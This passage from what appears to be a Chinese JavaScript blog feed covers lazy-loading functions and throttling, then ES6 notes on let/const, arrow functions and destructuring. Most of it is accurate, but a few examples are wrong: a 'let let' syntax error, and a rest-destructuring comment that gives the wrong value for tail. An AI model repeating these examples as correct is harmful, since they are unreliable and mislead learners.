&#x2F;&#x2F;xmlHttpRequest对象</span><br></pre></td></tr></table></figure>

<p>上面的代码就是分支函数，分支的原理是：声明几个不同名称的对象，且为该不同名称对象声明一个相同的方法，然后根据不同的浏览器设计来实现，接着开始进行浏览器检测，并且根据浏览器检测来返回哪一个对象，不论返回的是哪一个对象，最后它一致对外的接口都是createXHR方法的；</p>
<p><strong>十一：惰性载入函数（也是解决兼容问题的）</strong></p>
<p>和上面分支的原理是一样的，代码也可以按照上面的推荐分支风格编码的；解决的问题也是解决多个if条件判断的；代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 代码如下：</span><br><span class="line">var addEvent &#x3D; function(el,type,handler)&#123;</span><br><span class="line">    addEvent &#x3D; el.addEventListener ? function(el,type,handler)&#123;</span><br><span class="line">        el.addEventListener(type,handler,false);</span><br><span class="line">    &#125; : function(el,type,handler) &#123;</span><br><span class="line">        el.attachEvent(&quot;on&quot; + type,handler);</span><br><span class="line">    &#125;</span><br><span class="line">    addEvent(el,type,handler);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>惰性载入函数也是在函数内部改变自身的一种方式，在重复执行的时候就不会再进行检测的；惰性载入函数的分支只会执行一次，即第一次调用的时候，其优点如下：</p>
<ol>
<li><p> 要执行的适当代码只有在实际调用函数时才执行。</p>
</li>
<li><p> 第一次调用该函数的时候，紧接着内部函数也会执行，但是正因为这个，所以后续继续调用该函数的话，后续的调用速度会很快；因此避免了多重条件；</p>
</li>
</ol>
<p><strong>十二：理解函数节流</strong></p>
<p>DOM操作的交互需要更多的内存和CPU时间，连续进行过多的DOM相关的操作可能会导致浏览器变慢甚至崩溃，函数节流的设计思想是让某些代码可以在间断的情况下连续重复执行，实现该方法可以使用定时器对该函数进行节流操作;</p>
<p>比如：第一次调用函数的时候，创建一个定时器，在指定的时间间隔下执行代码。当第二次执行的时候，清除前一次的定时器并设置另一个，将其替换成一个新的定时器;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 如下简单函数节流代码演示</span><br><span class="line">var throttle &#x3D; &#123;</span><br><span class="line">    timeoutId: null,</span><br><span class="line">    &#x2F;&#x2F; 需要执行的方法</span><br><span class="line">    preformMethod: function()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    &#x2F;&#x2F; 初始化需要调用的方法</span><br><span class="line">    process: function()&#123;</span><br><span class="line">        clearTimeout(this.timeoutId);</span><br><span class="line">        var self &#x3D; this;</span><br><span class="line">        self.timeoutId &#x3D; setTimeout(function()&#123;</span><br><span class="line">            self.preformMethod();</span><br><span class="line">        &#125;,100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#x2F;&#x2F; 执行操作</span><br><span class="line">throttle.process();</span><br></pre></td></tr></table></figure>

<p>函数节流解决的问题是一些代码(比如事件)无间断的执行，这可能会影响浏览器的性能，比如浏览器变慢或者直接崩溃。比如对于mouseover事件或者click事件，比如点击tab项菜单，无限的点击，有可能会导致浏览器会变慢操作，这时候我们可以使用函数节流的操作来解决；<br>原文地址：<a href="http://www.cnblogs.com/tugenhua0707/p/5046854.html">http://www.cnblogs.com/tugenhua0707/p/5046854.html</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>es6学习一</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/es6%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    <content><![CDATA[<h1 id="let和const"><a href="#let和const" class="headerlink" title="let和const"></a>let和const</h1><p>介绍let和const之前先说说var关键字，他有几个特点：</p>
<ol>
<li>可以重复声明<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br></pre></td></tr></table></figure></li>
<li>无法限制修改<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">a = <span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li>没有块级作用域<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i =<span class="number">0</span>; i &lt; <span class="number">10</span>; i++)  &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(i) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<h2 id="let的使用"><a href="#let的使用" class="headerlink" title="let的使用"></a>let的使用</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4>ES6 新增了let命令，用来声明变量。它的用法类似于var，但是所声明的变量，只在let命令所在的代码块内有效。</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a <span class="comment">// ReferenceError: a is not defined.</span></span><br><span class="line">b <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// for循环的计数器，就很合适使用let命令</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(i);</span><br><span class="line"><span class="comment">// ReferenceError: i is not defined</span></span><br></pre></td></tr></table></figure>

<h4 id="不存在变量提升"><a href="#不存在变量提升" class="headerlink" title="不存在变量提升"></a>不存在变量提升</h4><p>var命令会发生“变量提升”现象，即变量可以在声明之前使用，值为undefined。这种现象多多少少是有些奇怪的，按照一般的逻辑，变量应该在声明语句之后才可以使用。</p>
<p>为了纠正这种现象，let命令改变了语法行为，它所声明的变量一定要在声明后使用，否则报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<h4 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h4><p>在代码块内，使用let命令声明变量之前，该变量都是不可用的。这在语法上，称为“暂时性死区”</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="comment">// TDZ开始</span></span><br><span class="line">  tmp = <span class="string">&#x27;abc&#x27;</span>; <span class="comment">// ReferenceError</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// ReferenceError</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> tmp; <span class="comment">// TDZ结束</span></span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">  tmp = <span class="number">123</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(tmp); <span class="comment">// 123</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，在let命令声明变量tmp之前，都属于变量tmp的“死区”。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x; <span class="comment">// ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> undeclared_variable <span class="comment">// &quot;undefined&quot;</span></span><br></pre></td></tr></table></figure>
<p>“暂时性死区”也意味着typeof不再是一个百分之百安全的操作。</p>
<h4 id="不允许重复声明"><a href="#不允许重复声明" class="headerlink" title="不允许重复声明"></a>不允许重复声明</h4><p>let不允许在相同作用域内，重复声明同一个变量。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func() <span class="comment">// 不报错</span></span><br></pre></td></tr></table></figure>

<h4 id="ES6-的块级作用域"><a href="#ES6-的块级作用域" class="headerlink" title="ES6 的块级作用域"></a>ES6 的块级作用域</h4><p>let实际上为 JavaScript 新增了块级作用域。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> n = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">10</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(n); <span class="comment">// 5</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="const使用"><a href="#const使用" class="headerlink" title="const使用"></a>const使用</h2><p>const声明一个只读的常量。一旦声明，常量的值就不能改变。<br>const声明的变量不得改变值，这意味着，const一旦声明变量，就必须立即初始化，不能留到以后赋值。<br>const的作用域与let命令相同：只在声明所在的块级作用域内有效。<br>const命令声明的常量也是不提升，同样存在暂时性死区，只能在声明的位置后面使用。<br>const声明的常量，也与let一样不可重复声明。</p>
<h1 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h1><h4 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h4><p>ES6 允许使用“箭头”（=&gt;）定义函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="params">v</span> =&gt;</span> v;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="function">() =&gt;</span> <span class="number">5</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sum = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> num1 + num2;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span>(<span class="params">num1, num2</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果箭头函数的代码块部分多于一条语句，就要使用大括号将它们括起来，并且使用return语句返回。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> sum = <span class="function">(<span class="params">num1, num2</span>) =&gt;</span> &#123; <span class="keyword">return</span> num1 + num2; &#125;</span><br></pre></td></tr></table></figure>
<p>箭头函数的一个用处是简化回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常函数写法</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x * x;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数写法</span></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>].map(<span class="function"><span class="params">x</span> =&gt;</span> x * x);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正常函数写法</span></span><br><span class="line"><span class="keyword">var</span> result = values.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数写法</span></span><br><span class="line"><span class="keyword">var</span> result = values.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b);</span><br></pre></td></tr></table></figure>
<h4 id="使用注意点"><a href="#使用注意点" class="headerlink" title="使用注意点"></a>使用注意点</h4><p>箭头函数有几个使用注意点。</p>
<p>（1）函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。</p>
<p>（2）不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。</p>
<p>（3）不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。</p>
<p>（4）不可以使用yield命令，因此箭头函数不能用作 Generator 函数。</p>
<p>上面四点中，第一点尤其值得注意。this对象的指向是可变的，但是在箭头函数中，它是固定的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">  id: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">      event =&gt; <span class="built_in">this</span>.doSomething(event.type), <span class="literal">false</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  doSomething: <span class="function"><span class="keyword">function</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Handling &#x27;</span> + type  + <span class="string">&#x27; for &#x27;</span> + <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">handler.init() </span><br><span class="line"><span class="comment">// 出发点击事件会打印： Handling click for 123456</span></span><br></pre></td></tr></table></figure>
<p>这里要理解this的指向问题</p>
<p>this指向的固定化，并不是因为箭头函数内部有绑定this的机制，实际原因是箭头函数根本没有自己的this，导致内部的this就是外层代码块的this。正是因为它没有this，所以也就不能用作构造函数。</p>
<p>所以，箭头函数转成 ES5 的代码如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;id:&#x27;</span>, <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _this = <span class="built_in">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;id:&#x27;</span>, _this.id);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，转换后的 ES5 版本清楚地说明了，箭头函数里面根本没有自己的this，而是引用外层的this。</p>
<p>请问下面的代码之中有几个this？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;id:&#x27;</span>, <span class="built_in">this</span>.id);</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = foo.call(&#123;<span class="attr">id</span>: <span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t1 = f.call(&#123;<span class="attr">id</span>: <span class="number">2</span>&#125;)()(); <span class="comment">// id: 1</span></span><br><span class="line"><span class="keyword">var</span> t2 = f().call(&#123;<span class="attr">id</span>: <span class="number">3</span>&#125;)(); <span class="comment">// id: 1</span></span><br><span class="line"><span class="keyword">var</span> t3 = f()().call(&#123;<span class="attr">id</span>: <span class="number">4</span>&#125;); <span class="comment">// id: 1</span></span><br></pre></td></tr></table></figure>
<h1 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h1><p>ES6 允许按照一定模式，从数组和对象中提取值，对变量进行赋值，这被称为解构（Destructuring）。本质上，这种写法属于“模式匹配”，只要等号两边的模式相同，左边的变量就会被赋予对应的值。<br>什么使模式匹配，从数组或对象等号左边和等号右边模式相同，对应的变量就是对应的值</p>
<h4 id="数组的解构赋值"><a href="#数组的解构赋值" class="headerlink" title="数组的解构赋值"></a>数组的解构赋值</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// es5可以这样声明变量</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// 也可以这样</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">let</span> [a, b, c] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">let</span> [x, , y] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="comment">//  x = 1, y = 3</span></span><br><span class="line"><span class="keyword">let</span> [head, ...tail] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]; <span class="comment">// head: 1, tail: [1, 2, 3, 4]</span></span><br><span class="line"><span class="keyword">let</span> [x, y, ...z] = [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">x <span class="comment">// &quot;a&quot;</span></span><br><span class="line">y <span class="comment">// undefined</span></span><br><span class="line">z <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>如果解构不成功变量的值就会等于undefined</p>
<p>不完全结构嵌套</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a, [b, c], d] = [<span class="number">1</span>, [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br><span class="line"><span class="keyword">let</span> [x, y] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="comment">// x = 1, y = 2</span></span><br></pre></td></tr></table></figure>
<p>上述代码中左右两边对应的结构式相同的，解构过程中会根据从左到右顺序一次给对应的变量赋值</p>
<p>注意：如果等号右边不是数组，则会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> [a] = <span class="number">1</span></span><br><span class="line"><span class="keyword">var</span> [c] = <span class="literal">true</span></span><br><span class="line"><span class="keyword">var</span> [a] = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> [a] = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">var</span> [a] = <span class="literal">null</span></span><br><span class="line"><span class="comment">// xx is not iterable</span></span><br></pre></td></tr></table></figure>
<p>可以设置默认值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [foo = <span class="literal">true</span>] = [];</span><br><span class="line">foo <span class="comment">// true</span></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br><span class="line"><span class="keyword">let</span> [x, y = <span class="string">&#x27;b&#x27;</span>] = [<span class="string">&#x27;a&#x27;</span>, <span class="literal">undefined</span>]; <span class="comment">// x=&#x27;a&#x27;, y=&#x27;b&#x27;</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">undefined</span>];</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>] = [<span class="literal">null</span>];</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>以上的代码总结：设置默认是es6内部使用严格（===）进行判断变量是否为undefined，只有等于undefined时，默认值设置才会生效</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [];     <span class="comment">// x=1; y=1</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [<span class="number">2</span>];    <span class="comment">// x=2; y=2</span></span><br><span class="line"><span class="keyword">let</span> [x = <span class="number">1</span>, y = x] = [<span class="number">1</span>, <span class="number">2</span>]; <span class="comment">// x=1; y=2</span></span><br><span class="line"><span class="comment">// 之所以会报错，是因为x用y做默认值时，y还没有声明。</span></span><br><span class="line"><span class="keyword">let</span> [x = y, y = <span class="number">1</span>] = [];     <span class="comment">// ReferenceError: y is not defined</span></span><br></pre></td></tr></table></figure>
<p>默认值可以引用解构赋值的其他变量，但该变量必须已经声明。</p>
<h4 id="对象的解构赋值"><a href="#对象的解构赋值" class="headerlink" title="对象的解构赋值"></a>对象的解构赋值</h4><p>对象的解构赋值和数组时类似<br>对象和变量解构对应，不同的是，属性必须是对象中存在的属性，否则变量就会等于undefined</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&quot;aaa&quot;</span>, <span class="attr">bar</span>: <span class="string">&quot;bbb&quot;</span> &#125;;</span><br><span class="line">foo <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">bar <span class="comment">// &quot;bbb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&quot;aaa&quot;</span>, <span class="attr">bar</span>: <span class="string">&quot;bbb&quot;</span> &#125;;</span><br><span class="line">baz <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果变量名和属性名不一样的情况</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line">baz <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">first</span>: <span class="string">&#x27;hello&#x27;</span>, <span class="attr">last</span>: <span class="string">&#x27;world&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">first</span>: f, <span class="attr">last</span>: l &#125; = obj;</span><br><span class="line">f <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">l <span class="comment">// &#x27;world&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 那么可以总结一下：以上的解构赋值的写法实际上是下面这种方式的简写</span></span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: foo, <span class="attr">bar</span>: bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&quot;aaa&quot;</span>, <span class="attr">bar</span>: <span class="string">&quot;bbb&quot;</span> &#125;;</span><br></pre></td></tr></table></figure>
<p>也就是说，对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; <span class="attr">foo</span>: baz &#125; = &#123; <span class="attr">foo</span>: <span class="string">&quot;aaa&quot;</span>, <span class="attr">bar</span>: <span class="string">&quot;bbb&quot;</span> &#125;;</span><br><span class="line">baz <span class="comment">// &quot;aaa&quot;</span></span><br><span class="line">foo <span class="comment">// error: foo is not defined</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。</p>
<p>对象的解构也可以指定默认值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;&#125;;</span><br><span class="line">x <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;x, y = <span class="number">5</span>&#125; = &#123;<span class="attr">x</span>: <span class="number">1</span>&#125;;</span><br><span class="line">x <span class="comment">// 1</span></span><br><span class="line">y <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">x</span>: y = <span class="number">3</span>&#125; = &#123;&#125;;</span><br><span class="line">y <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">x</span>: y = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="number">5</span>&#125;;</span><br><span class="line">y <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123; <span class="attr">message</span>: msg = <span class="string">&#x27;Something went wrong&#x27;</span> &#125; = &#123;&#125;;</span><br><span class="line">msg <span class="comment">// &quot;Something went wrong&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认值生效的条件是，对象的属性值严格等于undefined。</span></span><br><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="literal">undefined</span>&#125;;</span><br><span class="line">x <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> &#123;x = <span class="number">3</span>&#125; = &#123;<span class="attr">x</span>: <span class="literal">null</span>&#125;;</span><br><span class="line">x <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<h4 id="字符串的解构赋值"><a href="#字符串的解构赋值" class="headerlink" title="字符串的解构赋值"></a>字符串的解构赋值</h4><p>字符串也可以解构赋值。这是因为此时，字符串被转换成了一个类似数组的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [a, b, c, d, e] = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">a <span class="comment">// &quot;h&quot;</span></span><br><span class="line">b <span class="comment">// &quot;e&quot;</span></span><br><span class="line">c <span class="comment">// &quot;l&quot;</span></span><br><span class="line">d <span class="comment">// &quot;l&quot;</span></span><br><span class="line">e <span class="comment">// &quot;o&quot;</span></span><br></pre></td></tr></table></figure>
<p>类似数组的对象都有一个length属性，因此还可以对这个属性解构赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">length</span> : len&#125; = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">len <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>
<h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>变量的解构赋值用途很多。</p>
<p>（1）交换变量值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure>
<p>（2）从函数返回多个值</p>
